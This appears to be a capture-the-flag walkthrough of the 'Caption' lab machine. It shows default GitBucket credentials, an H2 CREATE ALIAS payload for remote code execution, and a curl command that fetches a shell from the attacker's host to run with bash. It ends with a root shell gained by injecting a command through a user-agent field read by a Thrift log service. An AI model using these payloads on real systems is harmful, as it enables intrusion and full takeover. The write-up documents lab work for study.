# Caption

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

## Port scan

```bash
Running initial fast Nmap scan on 10.129.54.249...
Open ports: 22,80,8080
Running detailed Nmap scan on ports: 22,80,8080...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-17 23:28 IST
Nmap scan report for caption.htb (10.129.54.249)
Host is up (0.22s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http       Werkzeug/3.0.1 Python/3.10.12
|_http-server-header: Werkzeug/3.0.1 Python/3.10.12
|_http-title: Caption Portal Login
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, X11Probe: 
|     HTTP/1.1 400 Bad request
|     Content-length: 90
|     Cache-Control: no-cache
|     Connection: close
|     Content-Type: text/html
|     <html><body><h1>400 Bad request</h1>
|     Your browser sent an invalid request.
|     </body></html>
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.1 301 Moved Permanently
|     content-length: 0
|     location: http://caption.htb
|_    connection: close
8080/tcp open  http-proxy
|_http-title: GitBucket
| fingerprint-strings: 
|   FourOhFourRequest: 
|   
|   << SNIP >>
|
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============

<< SNIP >>

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.11 seconds
Scan complete. Results saved in ports.scan

```



## Web attack

On visiting port 8080, we can login with Gitbucket default creds (`root:root`)

We can clone repositories  with same default creds, I checked with repos and didn't find anything good, so I moved on checking for other features that gitbucket provide.

I found [http://caption.htb:8080/admin/dbviewer](http://caption.htb:8080/admin/dbviewer) interesting, here we can use sql.

#### Note: IMP thing in recon are errors, try generating errors so you get what service is used in the backend.

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

We now know the server is using `H2 Database Engine` in the backend.

Next imp step in recon is find the version of the application running, upon quick googling I found this blog,&#x20;

{% embed url="https://www.stichlberger.com/blog/software/get-h2-database-version-string/" %}

We can use the following payload to lookout for version.

```sql
SELECT H2VERSION() FROM DUAL
```

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

Now we can confirm that backend runs H2 database: Version 1.4.199.

### Exploit

After googling for a while, I found few blogs,poc and wirteups.

1. [https://github.com/cExplr/H2\_RCE\_Exploit/tree/master](https://github.com/cExplr/H2_RCE_Exploit/tree/master)

{% embed url="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html" %}

The following snippet let's us execute code:

```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
CALL SHELLEXEC('id')
```

I tried using `curl MYIP:PORT/test` to test the payload



<figure><img src="../../../.gitbook/assets/image (152).png" alt=""><figcaption><p>I got a hit back from the server.</p></figcaption></figure>

Let's download a shell from our system and get user shell.

## User shell

<figure><img src="../../../.gitbook/assets/image (153).png" alt=""><figcaption></figcaption></figure>

1. command to download:

```sql
CREATE ALIAS SHELLEXECa AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
CALL SHELLEXECa('curl <ip>:<port>/shell -o /tmp/shell')
```

1. execute our downloaded binary

```sql
CREATE ALIAS SHELLEXECab AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
CALL SHELLEXECab('bash /tmp/shell')
```

<figure><img src="../../../.gitbook/assets/image (154).png" alt=""><figcaption><p>DONE!!</p></figcaption></figure>

We can add our .pub key in hosts `~/.ssh/authorized_keys` to have a better shell experience.

## Root shell

Honestly this is this first time I am working with thrift, I tried googling about vulnerabilities, workflow and didn't get enough data to exploit.

### I went chatgpt :)

{% embed url="https://chatgpt.com/share/66ed2c3d-5120-800c-afe4-1974a005a81b" %}

#### First I asked about the prgm

#### Key Components:

1. **LogServiceHandler**: This struct implements the `ReadLogFile` method defined in your Thrift service.

* **Regex Matching**:It uses a regular expression to find IP addresses in each line.
  * It attempts to extract a "user-agent" string from each line using another regex.
* **Logging Output**: For each line, it formats a string containing the found IP address, user-agent, and a timestamp. It then attempts to write this information to an output log file (`output.log`).
* **Command Execution**: The method uses `exec.Command` to run a shell command to append the formatted log entry to `output.log`.

#### Usage Scenario:

* You would run this server, and a client could connect to it on port 9090. The client would send a request with the path to a log file. The server processes the log file, extracting relevant data and saving it in a new output file.

> And this is what we are going to do

```bash
thrift --gen py log_service.thrift
```

Output:

*   After running the command, you will get a set of Python files in a new directory (usually named `gen-py` or something similar, depending on your setup). These files include:

    * **Client Stubs**: Code that allows you to create a client that can communicate with your Thrift server.
    * **Service Interfaces**: Classes and methods corresponding to the service defined in your Thrift file.
    * **Data Structures**: Classes for the data types defined in your Thrift file.



### Exploitation

I didn't wanna go through pain installing thrift on my system so I used remote machine and then transferred everything to my machine using python server and `wget -r`

<figure><img src="../../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

now do, `pip install thrift` just to use py client.

```python
from thrift import Thrift
from thrift.transport import TSocket
from thrift.transport import TTransport
from thrift.protocol import TBinaryProtocol
from log_service import LogService  # Make sure this matches your generated package

def main():
    # Set up the transport and protocol
    transport = TSocket.TSocket('localhost', 9090)
    transport = TTransport.TBufferedTransport(transport)
    protocol = TBinaryProtocol.TBinaryProtocol(transport)

    # Create a client using the generated code
    client = LogService.Client(protocol)

    # Open the transport
    try:
        transport.open()
        
        # Specify the log file path you want to read
        log_file_path = '/tmp/heap/pwn.log'  # Change this to your log file path
        
        # Call the ReadLogFile method
        response = client.ReadLogFile(log_file_path)
        print("Response from server:", response)
    
    except Thrift.TException as tx:
        print(f"Thrift error: {tx.message}")

    finally:
        # Close the transport
        transport.close()

if __name__ == '__main__':
    main()
```

Now create this on your remote machine and change `log_file_path` variable value based on your malicious log file is present.

If we see the `server.go` file of LogService repo,\
we need to bypass the following line:

```go
logs := fmt.Sprintf("echo 'IP Address: %s, User-Agent: %s, Timestamp: %s' >> output.log", ip, userAgent, timestamp)
exec.Command{"/bin/sh", "-c", logs}
```

Its using regex to get IP address and User-Agent

```go
    ipRegex := regexp.MustCompile(`\b(?:\d{1,3}\.){3}\d{1,3}\b`)
    userAgentRegex := regexp.MustCompile(`"user-agent":"([^"]+)"`)
    outputFile, err := os.Create("output.log")
    if err != nil {
        fmt.Println("Error creating output file:", err)
        return
    }
```

So in our payload we must have an `ip address` and `user-agent`

#### Payload

Our payload will look something like:

```bash
# <IP> "user-agent":"OUR PAYLOAD" rest things
# we need to escape
#"echo 'IP Address: %s, User-Agent: %s, Timestamp: %s' >> output.log", ip, userAgent, timestamp)

127.0.0.1 "user-agent":"';/bin/bash /tmp/heap/shell #" 

#breakdown:
"';/bin/bash /tmp/heap/shell #" > this is for %s
' inside is for escaping echo '
; is for running our /bin/bash even if our echo fails
# is for commenting out rest of the line.
```

Keeping all things, let's get root.

<figure><img src="../../../.gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>

\_\_\_\_\_\_\_\_\_\_\_\_heapbytes' still pwning.
